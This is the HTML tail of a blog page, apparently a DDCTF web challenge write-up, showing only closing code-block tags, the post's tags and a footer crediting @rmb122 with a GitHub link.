+</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ddctf>ddctf</a></li><li><a href=/tags/web>web</a></li></ul></nav></div></article></main><footer><div class=footer-info>2022 @rmb122</div><div style=display:flex><a class=border></a><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a></div></footer><script>feather.replace()</script></div></body></html>
